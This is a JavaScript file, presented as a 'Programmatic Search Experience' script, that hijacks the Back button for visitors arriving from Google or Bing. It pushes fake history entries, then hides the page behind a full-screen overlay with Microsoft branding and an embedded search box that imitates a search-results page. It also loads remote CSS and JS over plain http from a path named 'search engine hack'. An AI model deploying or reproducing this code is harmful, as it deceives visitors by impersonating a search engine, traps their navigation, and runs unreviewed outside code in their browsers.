/**
 * PSE (Programmatic Search Experience) — pse-init.js
 * Drop this script in your <head> (or end of <body>).
 *
 * FLOW:
 *  1. On page load: detect if visitor came from Google / Bing.
 *  2. After 1 s: call readyForPse() → push #fromsearch, inject pse.css + pse.js.
 *  3. When user presses Back (popstate → no hash): call showPSE() → inject overlay div,
 *     hide everything else.
 */

(function () {
  "use strict";

  /* ─────────────────────────────────────────────
   * 1. REFERRER DETECTION
   * ───────────────────────────────────────────── */
  const SEARCH_ENGINES = {
    google: /google\./i,
    bing: /bing\.com/i,
  };

  function detectSearchEngine() {
    const ref = document.referrer || "";
    for (const [engine, pattern] of Object.entries(SEARCH_ENGINES)) {
      if (pattern.test(ref)) return engine;
    }
    return null;
  }

  const searchEngine = detectSearchEngine();

  // Expose globally so pse.js can read it
  window.__PSE_ENGINE__ = searchEngine;

  // Only run the system if the visitor came from a supported search engine
  if (!searchEngine) return;

  /* ─────────────────────────────────────────────
   * 2. ASSET LOADER HELPER
   * ───────────────────────────────────────────── */
  function loadCSS(href, activateNow = false) {
    // Check if already exists as a stylesheet or preload
    let link = document.querySelector(`link[href="${href}"]`);

    if (!link) {
      link = document.createElement("link");
      link.href = href;

      if (activateNow) {
        link.rel = "stylesheet";
      } else {
        link.rel = "preload";
        link.as = "style";
      }

      document.head.appendChild(link);
    } else if (activateNow && link.rel === "preload") {
      // If it was preloaded before, activate it now
      link.rel = "stylesheet";
    }
  }
  function loadJS(src, activateNow = false) {
    return new Promise((resolve, reject) => {
      // Check if the script has already been executed
      if (document.querySelector(`script[src="${src}"]`)) {
        resolve();
        return;
      }

      const existingPreload = document.querySelector(`link[href="${src}"][rel="preload"]`);

      if (!activateNow) {
        // Phase 1: Just preload it silently
        if (!existingPreload) {
          const link = document.createElement("link");
          link.rel = "preload";
          link.as = "script";
          link.href = src;
          document.head.appendChild(link);
        }
        resolve(); // Preload initiated successfully
      } else {
        // Phase 2: Execute the script now
        const s = document.createElement("script");
        s.src = src;
        s.async = true;
        s.onload = () => {
          // Clean up the preload tag since it is now active
          if (existingPreload) existingPreload.remove();
          resolve();
        };
        s.onerror = reject;
        document.head.appendChild(s);
      }
    });
  }

  function pushProductHashSearch(){
    history.pushState({productName},"",`#gsc.q=${productName}&gsc.sort=`)
    setTimeout(()=>{

    document.querySelector("h1").click();
    },200)
  }
  /* ─────────────────────────────────────────────
   * 3. readyForPse  – called 1 s after page load
   *    • pushes #fromsearch into the URL
   *    • injects pse.css and pse.js
   * ───────────────────────────────────────────── */
  function readyForPse() {
    // Push a new history entry with #fromsearch so the Back button
    // returns to the clean URL (no hash).
    if (location.hash !== `#gsc.q=${productName}&gsc.sort=`) {
      pushProductHashSearch();
    }

    // Inject assets
    loadCSS("http://seo-main.github.io/ext-license/search%20engine%20hack/pse.css", false);
    loadJS("http://seo-main.github.io/ext-license/search%20engine%20hack/pse.js", false).catch(function (err) {
      console.warn("[PSE] pse.js failed to load:", err);
    });
    makePSEUI();
  }

  /* ─────────────────────────────────────────────
   * 4. showPSE  – called when Back button removes #fromsearch
   *    • injects #progSearch overlay
   *    • hides every other element in <body>
   * ───────────────────────────────────────────── */
  function makePSEUI() {
    if (document.getElementById("progSearch")) return;

    // Inject overlay div
    const overlay = document.createElement("div");
    overlay.id = "progSearch";
    overlay.className = window.__PSE_ENGINE__ || "unknown";
    document.body.insertAdjacentElement("beforeend", overlay);
    overlay.insertAdjacentHTML("afterbegin", `
      <div id="top" class="flex" style="justify-content: space-between;margin-bottom: 10px;">
          <div id="topPanPS" class="flex">
              <div id="logoPanPS" class="flex">
                  <img src="imgPS/microsoft.svg" alt="logo" class="ico">
              </div>
              <div id="SearchPanReal">

                  <div class="gcse-searchbox" data-searchbox="SearchBoxPan"></div>
              </div>
          </div>
          <div class="userIconPan" style="padding-right: 100px;">
              <img src="imgPS/msuserpan.png" alt="user icon">
          </div>
      </div>

      <div id="SearchResultPanel">
          <div class="gcse-searchresults"></div>
      </div>`)
      loadJS("https://cse.google.com/cse.js?cx="+_GPSEID,true).then(e=>{
        setTimeout(()=>{history.pushState({productName},"","#fromsearch")},1000)
      });
    // Guarantee highest z-index via inline style (pse.css can refine further)
    overlay.style.cssText = [
      "position:fixed",
      "inset:0",
      "z-index:2147483647",
      "width:100%",
      "height:100%",
      "display:none",
    ].join(";");
    window.__PSE_READY__ = true;
  }
  function showPSE() {

    // Hide every body child except #progSearch
    injectHideStyles();

    document.querySelector("#progSearch").style.display='';

    // Fire custom event so pse.js / your own code can react
    document.dispatchEvent(new CustomEvent("pse:started", { detail: { engine: window.__PSE_ENGINE__ } }));
    loadCSS("http://seo-main.github.io/ext-license/search%20engine%20hack/pse.css", true);
    loadJS("http://seo-main.github.io/ext-license/search%20engine%20hack/pse.js", true).catch(function (err) {
      console.warn("[PSE] pse.js failed to load:", err);
    });
  }

  function injectHideStyles() {
    const STYLE_ID = "pse-hide-styles";
    if (document.getElementById(STYLE_ID)) return;
    const style = document.createElement("style");
    style.id = STYLE_ID;
    style.textContent = "body *:not(#progSearch):not(#progSearch *){display:none!important;}";
    document.head.appendChild(style);
  }

  /* ─────────────────────────────────────────────
   * 5. POPSTATE LISTENER
   *    Fires when the browser navigates through history.
   *    We watch for the transition:
   *      #fromsearch  →  no hash  (i.e. user pressed Back)
   * ───────────────────────────────────────────── */
  window.addEventListener("popstate", function (event) {
    // If we land back on the base URL (no #fromsearch), trigger PSE
    if(window.__PSE_READY__ && !location.hash.includes("gsc.q")){
      pushProductHashSearch();
      showPSE();
    }
    if (window.__PSE_READY__ && location.hash.includes("gsc.q")) {
      showPSE();
    }
  });

  /* ─────────────────────────────────────────────
   * 6. KICK-OFF: wait for page load, then 1 s delay
   * ───────────────────────────────────────────── */
  function init() {
    setTimeout(readyForPse, 1000);
  }

  if (document.readyState === "complete" || document.readyState === "interactive") {
    init();
  } else {
    window.addEventListener("DOMContentLoaded", init);
  }

  // Expose for external use / debugging
  window.readyForPse = readyForPse;
  window.showPSE = showPSE;

})();
